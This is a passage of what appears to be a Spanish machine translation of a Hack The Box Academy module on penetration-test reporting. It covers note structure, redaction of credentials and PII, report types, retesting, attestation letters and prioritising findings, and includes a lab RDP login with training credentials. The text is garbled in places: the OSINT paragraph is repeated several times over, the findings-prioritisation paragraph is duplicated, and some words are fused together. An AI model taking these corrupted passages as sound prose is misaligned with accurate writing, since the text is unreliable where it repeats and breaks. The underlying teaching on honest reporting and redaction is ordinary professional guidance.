    │   │   ├── 8. Vulnerability Scan Research.md
    │   │   └── 9. Service Enumeration Research.md
    │   ├── OSINT
    │   ├── Scans
    │   │   ├── AD Enumeration
    │   │   ├── Service
    │   │   ├── Vuln
    │   │   └── Web
    │   └── Wireless
    └── Retest

16 directories, 16 files
```

Recordatorio: La carpeta y la estructura de toma de notas que se muestran arriba es lo que nos ha funcionado en nuestras carreras, pero diferirá de persona a persona y de compromiso a compromiso. Le recomendamos que pruebe esto como base, vea cómo funciona para usted y lo use como base para crear un estilo que funcione para usted. Lo importante es que somos minuciosos y organizados, y no hay una forma singular de abordar esto. Obsidian es una gran herramienta, y este formato es limpio, fácil de seguir y fácilmente reproducible de compromiso a compromiso. Puede crear un script para crear la estructura de directorios y los 10 archivos de Markdown iniciales. Tendrá la oportunidad de jugar con esta estructura de muestra a través del acceso GUI a una VM Parrot al final de esta sección.

---

## Formato y Redacción

Credenciales e Información de Identificación Personal (`PII`) debe ser redactado en capturas de pantalla y cualquier cosa que sería moralmente objetable, como material gráfico o comentarios y lenguaje tal vez obsceno. También puede considerar lo siguiente:

- Agregar anotaciones a la imagen como flechas o cuadros para llamar la atención sobre los elementos importantes en la captura de pantalla, especialmente si están sucediendo muchas cosas en la imagen (no lo hagas en MS Word).
    
- Agregar un borde mínimo alrededor de la imagen para que se destaque sobre el fondo blanco del documento.
    
- Recortar la imagen para mostrar solo la información relevante (por ejemplo, en lugar de una captura de pantalla completa, solo para mostrar un formulario de inicio de sesión básico).
    
- Incluya la barra de direcciones en el navegador o alguna otra información que indique a qué URL o host está conectado.
    

#### Capturas de pantalla

Siempre que sea posible, deberíamos intentar usar la salida del terminal sobre capturas de pantalla del terminal. Es más fácil redactar, resaltar las partes importantes (es decir, el comando que ejecutamos en texto azul y la parte de la salida a la que queremos llamar la atención en rojo), generalmente se ve más ordenada en el documento y puede evitar que el documento se convierta en un archivo masivo y difícil de manejar si tenemos muchos hallazgos. Debemos tener cuidado de no alterar la salida del terminal, ya que queremos dar una representación exacta del comando que ejecutamos y el resultado. Está bien acortar/cortar la salida innecesaria y marcar la parte eliminada con `<SNIP>` pero nunca altere la salida ni agregue cosas que no estaban en el comando o salida original. El uso de figuras basadas en texto también facilita que el cliente copie/pegue para reproducir sus resultados. También es importante que el material fuente que está pegando _de_ se ha eliminado todo el formato antes de ingresar a su documento de Word. Si está pegando texto que tiene formato incrustado, puede terminar pegando caracteres codificados que no sean UTF-8 en sus comandos (generalmente comillas o apóstrofes alternativas), lo que puede hacer que el comando no funcione correctamente cuando el cliente intenta reproducirlo.

Una forma común de redactar capturas de pantalla es a través de la pixelación o el desenfoque utilizando una herramienta como Greenshot. [Investigación](https://www.bleepingcomputer.com/news/security/researcher-reverses-redaction-extracts-words-from-pixelated-image/) ha demostrado que este método no es infalible, y hay una alta probabilidad de que los datos originales puedan recuperarse invirtiendo la técnica de pixelación/dibujación. Esto se puede hacer con una herramienta como [Inconformidad](https://github.com/bishopfox/unredacter). En cambio, debemos evitar esta técnica y usar barras negras (u otra forma sólida) sobre el texto que nos gustaría redactar. Deberíamos editar la imagen directamente y no solo aplicar una forma en MS Word, ya que alguien con acceso al documento podría eliminarlo fácilmente. Por otro lado, si está escribiendo una publicación de blog o algo publicado en la web con datos confidenciales redactados, no confíe en el estilo HTML/CSS para intentar ocultar el texto (es decir, texto negro con fondo negro), ya que esto se puede ver fácilmente resaltando el texto o editando la fuente de la página temporalmente. En caso de duda, use la salida de la consola, pero si debe usar una captura de pantalla de terminal, asegúrese de redactar adecuadamente la información. A continuación se presentan ejemplos de las dos técnicas:

#### Difuminar Datos de Contraseña

![Salida de terminal que muestra el comando CrackMapExec contra IP 172.16.5.5, lo que indica una conexión SMB exitosa a DC01 en el dominio INLANEFREIGHT.LOCAL.](https://academy.hackthebox.com/storage/modules/162/blurred.png)

#### Contraseña en Blanco con Forma Sólida

![Salida de terminal que muestra el comando CrackMapExec contra IP 172.16.5.5, lo que indica una conexión SMB exitosa a DC01 en el dominio INLANEFREIGHT.LOCAL.](https://academy.hackthebox.com/storage/modules/162/boxes.png)

Finalmente, aquí hay una forma sugerida de presentar evidencia terminal en un documento de informe. Aquí hemos conservado el comando y la salida originales, pero lo hemos mejorado para resaltar tanto el comando como la salida de interés (autenticación exitosa).

![Salida de terminal que muestra el comando CrackMapExec contra IP 172.16.5.5, lo que indica una conexión SMB exitosa a DC01 en el dominio INLANEFREIGHT.LOCAL con la contraseña redactada.](https://academy.hackthebox.com/storage/modules/162/terminal_output.png)

La forma en que presentamos la evidencia diferirá de un informe a otro. Podemos estar en una situación en la que no podemos copiar/pegar la salida de la consola, por lo que debemos confiar en una captura de pantalla. Los consejos aquí están destinados a proporcionar opciones para crear un informe ordenado pero preciso con toda la evidencia representada adecuadamente.

#### Terminal

Por lo general, lo único que debe redactarse desde la salida del terminal son las credenciales (ya sea en el comando en sí o en la salida del comando). Esto incluye hashes de contraseña. Para los hashes de contraseñas, generalmente puede eliminar el medio de ellos y dejar el primero y el último 3 o 4 caracteres para mostrar que en realidad había un hash allí. Para credenciales en texto claro o cualquier otro contenido legible por humanos que deba ofuscarse, puede reemplazarlo con un `<REDACTED>` o `<PASSWORD REDACTED>` marcador de posición, o similar.

También debe considerar el resaltado codificado por colores en la salida de su terminal para resaltar el comando que se ejecutó y la salida interesante de ejecutar ese comando. Esto mejora la capacidad del lector para identificar las partes esenciales de la evidencia y qué buscar si intentan reproducirla por sí mismos. Si está trabajando en una carga útil web compleja, puede ser difícil elegir la carga útil en un gigantesco muro de texto de solicitud codificado por URL si no lo hace para ganarse la vida. Debemos aprovechar todas las oportunidades para aclarar el informe a nuestros lectores, que a menudo no tendrán una comprensión tan profunda del entorno (especialmente desde la perspectiva de un probador de penetración) como lo hacemos al final de la evaluación.

---

## Qué No Archivar

Al comenzar una prueba de penetración, nuestros clientes confían en nosotros para ingresar a su red y "no hacer daño" siempre que sea posible. Esto significa no derribar ningún host o afectar la disponibilidad de aplicaciones o recursos, no cambiar las contraseñas (a menos que se permita explícitamente), realizar cambios de configuración significativos o difíciles de revertir, o ver o eliminar ciertos tipos de datos del entorno. Estos datos pueden incluir PII no redactada, información potencialmente criminal, cualquier cosa considerada legalmente "descubierta", etc. Por ejemplo, si obtiene acceso a un recurso compartido de red con datos confidenciales, probablemente sea mejor simplemente capturar el directorio con los archivos en él en lugar de abrir archivos individuales y capturar el contenido del archivo. Si los archivos son tan sensibles como crees, sonrecibirá el mensaje y sabrá qué hay en ellos según el nombre del archivo. Recopilar PII real y extraerla del entorno objetivo puede tener importantes obligaciones de cumplimiento para almacenar y procesar esos datos como GDPR y similares y podría abrir una serie de problemas para nuestra empresa y para nosotros.

---

## Ejercicios de Módulo

Hemos incluido un portátil Obsidian de muestra parcialmente rellenado en el host Parrot Linux que se puede generar al final de esta sección. Puede acceder a él con las credenciales proporcionadas utilizando el siguiente comando:

  Nota y Organización

```shell-session
vcrdcr@htb[/htb]$ xfreerdp /v:10.129.203.82 /u:htb-student /p:HTB_@cademy_stdnt!
```

Una vez conectado, puede abrir Obsidian desde el Escritorio, navegar por el portátil de muestra y revisar la información que se ha rellenado previamente con algunos datos de muestra basados en el laboratorio contra los que trabajaremos más adelante en este módulo cuando trabajemos a través de algunos opcionales (¡pero muy alentados!) ejercicios. También proporcionamos una copia de este cuaderno Obsidian que se puede descargar desde `Resources` en la parte superior derecha de cualquier sección de este módulo. Una vez descargado y descomprimido, puede abrir esto en una copia local de Obsidian seleccionando `Open folder as vault`. Se pueden encontrar instrucciones detalladas para crear o abrir una bóveda [aquí](https://help.obsidian.md/Getting+started/Create+a+vault).

---

## Hacia adelante

Ahora que hemos logrado un buen manejo de nuestra estructura de organización de carpetas y anotaciones y qué tipos de evidencia mantener y no mantener, y qué registrar para nuestros informes, hablemos de los diversos tipos de informes que nuestros clientes pueden solicitar dependiendo del tipo de compromiso.


# Tipos de Informes

---

Nuestra estructura de informes diferirá ligeramente según la evaluación que tenemos la tarea de realizar. En este módulo, nos centraremos principalmente en un informe de Prueba de Penetración Interna donde el probador logró un compromiso de dominio de Active Directory (AD) durante una Prueba de Penetración Interna. El informe con el que trabajaremos demostrará los elementos típicos de un informe de Prueba de Penetración Interna. Discutiremos aspectos de otros informes (como apéndices adicionales que pueden incluirse en un informe de Prueba de Penetración Externa). No es raro ver un informe de Prueba de Penetración Externa que resultó en un compromiso interno con una cadena de ataque y otros elementos que cubriremos. La principal diferencia en nuestro laboratorio es que no incluiremos datos de OSINT/información disponible públicamente, como direcciones de correo electrónico, subdominios, credenciales en volcados de incumplimiento, etcregistro de dominio/datos de propiedad, etc., porque no estamos probando contra una empresa real con presencia en Internet. Si bien hay algunos jugadores veteranos que tienen poder de permanencia como Have I Been Pwned, Shodan e Intelx, las herramientas OSINT también son generalmente muy fluidas, por lo que para cuando se publica este curso, la mejor herramienta o recurso para recopilar esa información puede haber cambiado. En su lugar, enumeramos algunos tipos comunes de información dirigida a ayudar en una prueba de penetración y dejamos que el lector pruebe y descubra qué herramientas o API proporcionan los mejores resultados. Siempre es una buena idea no depender de ninguna herramienta, así que ejecute múltiples y vea cuál es la diferencia en los datos.Si bien hay algunos jugadores veteranos que tienen poder de permanencia como Have I Been Pwned, Shodan e Intelx, las herramientas OSINT también son generalmente muy fluidas, por lo que para cuando se publica este curso, la mejor herramienta o recurso para recopilar esa información puede haber cambiado. En su lugar, enumeramos algunos tipos comunes de información dirigida a ayudar en una prueba de penetración y dejamos que el lector pruebe y descubra qué herramientas o API proporcionan los mejores resultados. Siempre es una buena idea no depender de ninguna herramienta, así que ejecute múltiples y vea cuál es la diferencia en los datos.Si bien hay algunos jugadores veteranos que tienen poder de permanencia como Have I Been Pwned, Shodan e Intelx, las herramientas OSINT también son generalmente muy fluidas, por lo que para cuando se publica este curso, la mejor herramienta o recurso para recopilar esa información puede haber cambiado. En su lugar, enumeramos algunos tipos comunes de información dirigida a ayudar en una prueba de penetración y dejamos que el lector pruebe y descubra qué herramientas o API proporcionan los mejores resultados. Siempre es una buena idea no depender de ninguna herramienta, así que ejecute múltiples y vea cuál es la diferencia en los datos.enumeramos algunos tipos comunes de información dirigida a ayudar en una prueba de penetración y dejamos que el lector pruebe y descubra qué herramientas o API proporcionan los mejores resultados. Siempre es una buena idea no depender de ninguna herramienta, así que ejecute múltiples y vea cuál es la diferencia en los datos.enumeramos algunos tipos comunes de información dirigida a ayudar en una prueba de penetración y dejamos que el lector pruebe y descubra qué herramientas o API proporcionan los mejores resultados. Siempre es una buena idea no depender de ninguna herramienta, así que ejecute múltiples y vea cuál es la diferencia en los datos.

- DNS público y registros de propiedad de dominio
- Direcciones de Correo Electrónico
    - Luego puede usarlos para verificar si alguno ha estado involucrado en una violación o usar Google Dorks para buscarlos en sitios como Pastebin
- Subdominios
- Proveedores de terceros
- Dominios similares
- Recursos de nube pública

Estos tipos de recopilación de información están cubiertos en otros módulos, tales como [Recopilación de Información - Web Edition](https://academy.hackthebox.com/course/preview/information-gathering---web-edition), [OSINT: Recon Corporativo](https://academy.hackthebox.com/course/preview/osint-corporate-recon), y [Huella](https://academy.hackthebox.com/course/preview/footprinting) y están fuera del alcance de este módulo.

---

## Diferencias entre Tipos de Evaluación

Antes de revisar los diversos tipos de informes disponibles y luego profundizar en los componentes de un informe de Prueba de Penetración, definamos algunos tipos de evaluación clave.

#### Evaluación de Vulnerabilidad

Las evaluaciones de vulnerabilidad implican ejecutar un escaneo automatizado de un entorno para enumerar vulnerabilidades. Estos pueden ser autenticados o no autenticados. No se intenta explotar, pero a menudo buscaremos validar los resultados del escáner para que nuestro informe pueda mostrar a un cliente qué resultados del escáner son problemas reales y cuáles son falsos positivos. La validación puede consistir en realizar una verificación adicional para confirmar que una versión vulnerable está en uso o que existe una configuración/configuración incorrecta, pero el objetivo no es obtener un punto de apoyo y moverse lateralmente/verticalmente. Algunos clientes incluso solicitarán resultados de escaneo sin validación.

#### Interno vs Externo

Se realiza un escaneo externo desde la perspectiva de un usuario anónimo en Internet dirigido a los sistemas públicos de la organización. Se realiza un escaneo interno desde la perspectiva de un escáner en la red interna e investiga los hosts desde detrás del firewall. Esto se puede hacer desde la perspectiva de un usuario anónimo en la red de usuarios corporativos, emulando un servidor comprometido o cualquier número de escenarios diferentes. Un cliente puede incluso solicitar que se realice un escaneo interno con credenciales, lo que puede llevar a que se examinen considerablemente más hallazgos del escáner, pero también producirá resultados más precisos y menos genéricos.

#### Reportar Contenido

Estos informes generalmente se centran en temas que se pueden observar en los resultados del escaneo y resaltan la cantidad de vulnerabilidades y sus niveles de gravedad. Estos escaneos pueden producir una GRAN CANTIDAD de datos, por lo que identificar patrones y mapearlos a deficiencias de procedimiento es importante para evitar que la información se vuelva abrumadora.

---

## Pruebas de Penetración

Las pruebas de penetración van más allá de los escaneos automatizados y pueden aprovechar los datos de escaneo de vulnerabilidades para ayudar a guiar la explotación. Al igual que los escaneos de vulnerabilidad, estos se pueden realizar desde una perspectiva interna o externa. Dependiendo del tipo de prueba de penetración (es decir, una prueba evasiva), es posible que no realicemos ningún tipo de escaneo de vulnerabilidades.

Se puede realizar una prueba de penetración desde diversas perspectivas, tales como "`black box`," donde no tenemos más información que el nombre de la empresa durante una conexión externa o de red para una interna, "`grey box`"donde se nos dan solo direcciones IP dentro del alcance/rangos de red CIDR, o "`white box`"donde se nos pueden dar credenciales, código fuente, configuraciones y más. Las pruebas se pueden realizar con `zero evasion` para intentar descubrir tantas vulnerabilidades como sea posible, desde un `hybrid evasive`punto de vista para probar las defensas del cliente comenzando evasivo y gradualmente convirtiéndose en "más ruidoso" para ver a qué nivel los equipos de seguridad interna/herramientas de monitoreo nos detectan y bloquean. Por lo general, una vez que se detectan en este tipo de evaluación, el cliente nos pedirá que pasemos a pruebas no evasivas para el resto de la evaluación. Este es un gran tipo de evaluación para recomendar a los clientes con algunas defensas en su lugar, pero no una postura de seguridad defensiva altamente madura. Puede ayudar a mostrar brechas en sus defensas y dónde deben concentrar los esfuerzos en mejorar sus reglas de detección y prevención. Para clientes más maduros, este tipo de evaluación puede ser una gran prueba de sus defensas y procedimientos internos para garantizar que todas las partes desempeñen sus funciones correctamente en caso de un ataque real.

Finalmente, se nos puede pedir que actuemos `evasive testing` a lo largo de la evaluación. En este tipo de evaluación, intentaremos permanecer sin ser detectados durante el mayor tiempo posible y ver qué tipo de acceso, si lo hay, podemos obtener mientras trabajamos sigilosamente. Esto puede ayudar a simular un atacante más avanzado. Sin embargo, este tipo de evaluación a menudo está limitada por restricciones de tiempo que no están en su lugar para un atacante del mundo real. Un cliente también puede optar por una simulación de adversario a más largo plazo que puede ocurrir durante varios meses, con poco personal de la compañía al tanto de la evaluación y poco o ningún personal del cliente que conozca el día/hora de inicio exacto de la evaluación. Este tipo de evaluación es adecuado para organizaciones maduras más seguras y requiere un conjunto de habilidades diferente al de un probador tradicional de penetración de red/aplicación.

#### Interno vs Externo

Similar a las perspectivas de escaneo de vulnerabilidades, las pruebas de penetración externas generalmente se realizarán desde la perspectiva de un atacante anónimo en Internet. Puede aprovechar los datos de OSINT/información disponible públicamente para intentar obtener acceso a datos confidenciales a través de aplicaciones o la red interna atacando a los hosts orientados a Internet. Las pruebas de penetración interna pueden realizarse como un usuario anónimo en la red interna o como un usuario autenticado. Por lo general, se realiza para encontrar tantos defectos como sea posible para obtener un punto de apoyo, realizar una escalada de privilegios horizontal y vertical, moverse lateralmente y comprometer la red interna (típicamente el entorno de Active Directory del cliente).

---

## Evaluaciones Interdisciplinarias

Algunas evaluaciones pueden requerir la participación de personas con diversos conjuntos de habilidades que se complementan entre sí. Si bien son logísticamente más complejos, tienden a ser orgánicamente más colaborativos entre el equipo de consultoría y el cliente, lo que agrega un gran valor a la evaluación y la confianza en la relación. Algunos ejemplos de este tipo de evaluaciones incluyen:

#### Evaluaciones de Estilo de Equipo Púrpura

Como su nombre lo indica, este es un esfuerzo combinado entre los equipos azul y rojo, más comúnmente un probador de penetración y un respondedor de incidentes. El concepto general es que el probador de penetración simula una amenaza dada, y el respondedor de incidentes trabaja con el equipo azul interno para revisar su conjunto de herramientas existente para determinar si la alerta está configurada correctamente o si se necesitan ajustes para permitir una identificación correcta.

#### Pruebas de Penetración Centradas en la Nube

Si bien se superpone con una prueba de penetración convencional, una evaluación con un enfoque en la nube se beneficiará del conocimiento de alguien con experiencia en arquitectura y administración de la nube. A menudo puede ser tan simple como ayudar a articular al probador de penetración lo que es posible abusar con una información particular que se descubrió (como secretos o claves de algún tipo). Obviamente, cuando comienzas a introducir infraestructura menos convencional como contenedores y aplicaciones sin servidor, el enfoque para probar esos recursos requiere un conocimiento muy específico, probablemente una metodología y un kit de herramientas completamente diferentes. Como los informes para este tipo de evaluaciones son relativamente similares a las pruebas de penetración convencionales, se mencionan en este contexto para la concienciapero los detalles técnicos sobre la prueba de estos recursos únicos están fuera del alcance de este curso.

#### Pruebas Integrales de IoT

Las plataformas IoT generalmente tienen tres componentes principales: red, nube y aplicación. Hay personas que están muy especializadas en cada una de ellas que podrán proporcionar una evaluación mucho más completa en lugar de confiar en una persona con solo conocimientos básicos en cada área. Otro componente que puede necesitar ser probado es la capa de hardware, que se cubre a continuación. Similar a las pruebas en la nube, hay aspectos de estas pruebas que probablemente requerirán un conjunto de habilidades especializadas fuera del alcance de este curso, pero el diseño del informe de pruebas de penetración estándar todavía se presta bien para presentar este tipo de datos.

---

## Pruebas de Penetración de Aplicaciones Web

Dependiendo del alcance, este tipo de evaluación también puede considerarse una evaluación interdisciplinaria. Algunas evaluaciones de aplicaciones solo pueden centrarse en identificar y validar las vulnerabilidades en una aplicación con pruebas autenticadas basadas en roles sin interés en evaluar el servidor subyacente. Otros pueden querer probar tanto la aplicación como la infraestructura con la intención de que el compromiso inicial sea a través de la aplicación web en sí (nuevamente, tal vez desde una perspectiva autenticada o basada en roles) y luego intentar ir más allá de la aplicación para ver qué otros hosts y sistemas detrás de ella existen que pueden verse comprometidos. El último tipo de evaluación se beneficiaría de alguien con un desarrollo y antecedentes de pruebas de aplicación para el compromiso inicial y luego tal vez un probador de penetración centrado en la red para "vivir de la tierra" y moverse o escalar privilegios a través de Active Directory o algún otro medio más allá de las aplicaciones en sí.

---

## Pruebas de Penetración de Hardware

Este tipo de pruebas a menudo se realiza en dispositivos de tipo IoT, pero se puede extender a probar la seguridad física de una computadora portátil enviada por el cliente o un quiosco o ATM en el sitio. Cada cliente tendrá un nivel de comodidad diferente con la profundidad de las pruebas aquí, por lo que es vital establecer las reglas de compromiso antes de que comience la evaluación, particularmente cuando se trata de pruebas destructivas. Si el cliente espera que su dispositivo vuelva a funcionar de una sola pieza, es probable que no sea aconsejable probar la desoldadura de chips de la placa base o ataques similares.

---

## Proyecto de Informe

Cada vez es más común que los clientes esperen tener un diálogo e incorporar sus comentarios en un informe. Esto puede venir en muchas formas, ya sea que quieran agregar comentarios sobre cómo planean abordar cada hallazgo (respuesta de gestión), modificar el lenguaje potencialmente inflamatorio o mover las cosas a donde mejor se adapte a sus necesidades. Por estas razones, lo mejor es planear enviar un borrador de informe primero, dando tiempo al cliente para revisarlo por su cuenta, y luego ofreciendo un intervalo de tiempo donde puedan revisarlo con usted para hacer preguntas, obtener aclaraciones o explicar lo que les gustaría ver. El cliente está pagando por el informe entregable al final, y debemos asegurarnos de que sea lo más completo y valioso posible para ellos. Algunos no comentarán el informe en absolutomientras que otros pedirán cambios/adiciones significativos para ayudarlo a satisfacer sus necesidades, ya sea para que sea presentable a su junta directiva para obtener fondos adicionales o para usar el informe como una entrada a su hoja de ruta de seguridad para realizar remediaciones y endurecer su postura de seguridad.

---

## Informe Final

Por lo general, después de revisar el informe con el cliente y confirmar que está satisfecho con él, puede emitir el informe final con las modificaciones necesarias. Esto puede parecer un proceso frívolo, pero varias firmas de auditoría no aceptarán un borrador de informe para cumplir con sus obligaciones de cumplimiento, por lo que es importante desde la perspectiva del cliente.

#### Informe Post-Remediación

También es común que un cliente solicite que los hallazgos que descubrió durante la evaluación original se prueben nuevamente después de haber tenido la oportunidad de corregirlos. Todo esto es casi necesario para las organizaciones en deuda con un estándar de cumplimiento como PCI. Tú **no debería** rehacer toda la evaluación para esta fase de la evaluación. Pero en cambio, debe centrarse en volver a probar solo los hallazgos y solo los anfitriones afectados por esos hallazgos de la evaluación original. También desea asegurarse de que haya un límite de tiempo sobre cuánto tiempo después de la evaluación inicial realizamos las pruebas de remediación. Estas son algunas de las cosas que podrían suceder si no lo haces.

- El cliente le pide que pruebe su remediación varios meses o incluso un año o más después, y el entorno ha cambiado tanto que es imposible obtener una comparación de "manzanas a manzanas".
    
- Si comprueba todo el entorno en busca de nuevos hosts afectados por un hallazgo determinado, puede descubrir nuevos hosts que se ven afectados y caer en un bucle interminable de pruebas de remediación de los nuevos hosts que descubrió la última vez.
    
- Si ejecuta nuevos escaneos a gran escala como escaneos de vulnerabilidad, es probable que encuentre cosas que no estaban allí antes, y su alcance se descontrolará rápidamente.
    
- Si un cliente tiene un problema con la naturaleza de "instantánea" de este tipo de pruebas, podría recomendar una herramienta de tipo Breach and Attack Simulation (BAS) para ejecutar periódicamente esos escenarios para asegurarse de que no continúen apareciendo.
    

Si ocurre alguna de estas situaciones, debe esperar un mayor escrutinio en torno a los niveles de gravedad y tal vez la presión para modificar las cosas que no deben modificarse para ayudarlos. En estas situaciones, su respuesta debe ser cuidadosamente diseñada para tener claro que no va a cruzar los límites éticos (pero tenga cuidado al insinuar que le están pidiendo que haga algo intencionalmente deshonesto, lo que indica que son deshonestos), pero también se compadecen con su situación y ofrecen algunas formas de salir de ella para ellos. Por ejemplo, si su preocupación es estar en el gancho con un auditor para arreglar algo en una cantidad de tiempo que no tienenes posible que no sepan que muchos auditores aceptarán un plan de remediación completamente documentado con un plazo razonable (y una justificación de por qué no se puede completar más rápidamente) en lugar de remediar y cerrar el hallazgo dentro del período de examen. Esto le permite mantener su integridad intacta, fomenta la sensación con el cliente de que se preocupa sinceramente por su difícil situación y les da un camino a seguir sin tener que volverse de adentro hacia afuera para que esto suceda.

Un enfoque podría ser tratar esto como una nueva evaluación en estas situaciones. Si el cliente no está dispuesto, entonces es probable que queramos volver a probar solo los hallazgos del informe original y anotar cuidadosamente en el informe el tiempo transcurrido desde la evaluación original, que este es un punto en el tiempo para evaluar si SOLO las vulnerabilidades informadas anteriormente afectan al host o hosts informados originalmente y que es probable que el entorno del cliente haya cambiado significativamente y no se realizó una nueva evaluación.

En términos de diseño de informes, algunas personas pueden preferir actualizar la evaluación original etiquetando los hosts afectados en cada hallazgo con un estado (por ejemplo, resuelto, no resuelto, parcial, etc.), mientras que otros pueden preferir emitir un nuevo informe por completo que tenga algún contenido de comparación adicional y un resumen ejecutivo actualizado.

---

## Informe de Certificación

Algunos clientes solicitarán un `Attestation Letter` o `Attestation Report` eso es adecuado para sus proveedores o clientes que requieren evidencia de que han realizado una prueba de penetración. La diferencia más significativa es que su cliente no querrá entregar los detalles técnicos específicos de todos los hallazgos o credenciales u otra información secreta que pueda incluirse a un tercero. Este documento puede derivarse del informe. Debe centrarse solo en el número de hallazgos descubiertos, el enfoque adoptado y los comentarios generales sobre el entorno en sí. Es probable que este documento solo tenga una o dos páginas.

---

## Otros Entregables

#### Cubierta de Diapositiva

También se le puede solicitar que prepare una presentación que se puede dar en varios niveles diferentes. Su audiencia puede ser técnica o puede ser más ejecutiva. El lenguaje y el enfoque deben ser tan diferentes en su presentación ejecutiva como el resumen ejecutivo es de los detalles de búsqueda técnica en su informe. Solo incluir gráficos y números pondrá a su audiencia a dormir, por lo que es mejor estar preparado con algunas anécdotas de su propia experiencia o tal vez algunos eventos actuales recientes que se correlacionan con un vector de ataque específico o compromiso. Puntos de bonificación si dicha historia está en la misma industria que su cliente. El propósito de esto no es alarmismo, y debes tener cuidado de no presentarlo de esa manera, pero ayudará a mantener la atención de tu audiencia.Hará que el riesgo sea lo suficientemente relacionable como para maximizar sus posibilidades de hacer algo al respecto.

#### Hoja de cálculo de los hallazgos

La hoja de cálculo de los hallazgos debe ser bastante autoexplicativa. Estos son todos los campos en los hallazgos de su informe, solo en un diseño tabular que el cliente puede usar para una clasificación más fácil y otra manipulación de datos. Esto también puede ayudarlos a importar esos hallazgos en un sistema de venta de boletos para fines de seguimiento interno. Este documento debería _no_ incluya su resumen ejecutivo o narrativas. Idealmente, aprenda a usar tablas pivotantes y úselas para crear algunos análisis interesantes que el cliente pueda encontrar interesantes. El objetivo más útil para hacer esto es clasificar los hallazgos por gravedad o categoría para ayudar a priorizar la remediación.

---

## Notificaciones de Vulnerabilidad

A veces, durante una evaluación, descubriremos una falla crítica que requiere que dejemos de trabajar e informemos a nuestros clientes sobre un problema para que puedan decidir si desean emitir una solución de emergencia o esperar hasta que finalice la evaluación.

#### Cuándo Redactar Uno

Como mínimo, esto debe hacerse para `any` encontrar eso es `directly exploitable` eso es `exposed to the internet` y da como resultado la ejecución remota de código no autenticada o la exposición de datos confidenciales, o aprovecha las credenciales débiles/predeterminadas para la misma. Más allá de eso, se deben establecer expectativas para esto durante el proceso de inicio del proyecto. Algunos clientes pueden querer que todos los hallazgos altos y críticos se informen fuera de banda, independientemente de si son internos o externos. Algunas personas también pueden necesitar medios. Por lo general, es mejor establecer una línea de base para usted, decirle al cliente qué esperar y dejar que le pidan modificaciones al proceso si las necesitan.

#### Contenidos

Debido a la naturaleza de estas notificaciones, es importante limitar la cantidad de pelusa en estos documentos para que las personas técnicas puedan acceder directamente a los detalles y comenzar a solucionar el problema. Por esta razón, probablemente sea mejor limitar esto al contenido típico que tiene en los detalles técnicos de sus hallazgos y proporcionar evidencia basada en herramientas para el hallazgo de que el cliente puede reproducir rápidamente si es necesario.

---

## Piezing it Juntos

Ahora que hemos cubierto los diversos tipos de evaluación y tipos de informes que se nos puede pedir que creemos para nuestros clientes, sigamos adelante y hablemos sobre los componentes de un informe.


# Componentes de un Informe

---

Como se mencionó anteriormente, el informe es el principal entregable que un cliente está pagando cuando contrata a su empresa para realizar una prueba de penetración. El informe es nuestra oportunidad de mostrar nuestro trabajo durante la evaluación y proporcionar al cliente el mayor valor posible. Idealmente, el informe estará libre de datos e información extraños que "desordenen" el informe o distraigan de los problemas que estamos tratando de transmitir de la imagen general de su postura de seguridad que estamos tratando de pintar. Todo en el informe debe tener una razón para estar allí, y no queremos abrumar al lector (por ejemplo, ¡no pegue en 50+ páginas de salida de consola!). En esta sección, cubriremos los elementos clave de un informe y cómo podemos estructurarlo mejor para mostrar nuestro trabajo y ayudar a nuestros clientes a priorizar la remediación.

---

## Priorizando Nuestros Esfuerzos

Durante una evaluación, especialmente las grandes, nos enfrentaremos a un montón de "ruido" que necesitamos filtrar para enfocar mejor nuestros esfuerzos y priorizar los hallazgos. Como probadores, estamos obligados a revelar todo lo que encontramos, pero cuando hay un montón de información que nos llega a través de escaneos y enumeraciones, es fácil perderse o centrarse en las cosas equivocadas y perder el tiempo y potencialmente perder problemas de alto impacto. Es por eso que es esencial que entendamos el resultado que producen nuestras herramientas, que tengamos pasos repetibles (como scripts u otras herramientas) para examinar todos estos datos, procesarlos y eliminar falsos positivos o problemas informativos que podrían distraernos del objetivo de la evaluación.La experiencia y un proceso repetible son clave para que podamos examinar todos nuestros datos y centrar nuestros esfuerzos en hallazgos de alto impacto, como fallas de ejecución remota de código (RCE) u otros que puedan conducir a la divulgación de datos confidenciales. Vale la pena (y nuestro deber) informar los hallazgos informativos, pero en lugar de pasar la mayor parte de nuestro tiempo validando estos problemas menores y no explotables, es posible que desee considerar la consolidación de algunos de ellos en categorías que muestren al cliente que sabía que los problemas existían, pero no pudo explotarlos de manera significativa (por ejemplo 35 variaciones diferentes de problemas con SSL/TLS, una tonelada de vulnerabilidades DoS en una versión EOL de PHP, etc.).pero en lugar de pasar la mayor parte de nuestro tiempo validando estos problemas menores y no explotables, es posible que desee considerar la consolidación de algunos de ellos en categorías que muestren al cliente que sabía que los problemas existían, pero no pudo explotarlos de manera significativa (por ejemplo, 35 variaciones diferentes de problemas con SSL/TLS una tonelada de vulnerabilidades DoS en una versión EOL de PHP, etc.).pero en lugar de pasar la mayor parte de nuestro tiempo validando estos problemas menores y no explotables, es posible que desee considerar la consolidación de algunos de ellos en categorías que muestren al cliente que sabía que los problemas existían, pero no pudo explotarlos de manera significativa (por ejemplo, 35 variaciones diferentes de problemas con SSL/TLS una tonelada de vulnerabilidades DoS en una versión EOL de PHP, etc.).

Al comenzar en las pruebas de penetración, puede ser difícil saber qué priorizar, y podemos caer en agujeros de conejo tratando de explotar una falla que no existe o hacer que un exploit PoC roto funcione. El tiempo y la experiencia ayudan aquí, pero también debemos apoyarnos en los miembros principales del equipo y mentores para ayudar. Algo que puedes perder medio día podría ser algo que han visto muchas veces y podría decirte rápidamente si es un falso positivo o si vale la pena agotarse. Incluso si no pueden darte una respuesta en blanco y negro realmente rápida, al menos pueden apuntarte en una dirección que te ahorre varias horas. Rodéate de gente con la que te sientas cómodo pidiendo ayuda que no te haga sentir como un idiota si no sabes todas las respuestas.

---

## Escribiendo una Cadena de Ataque

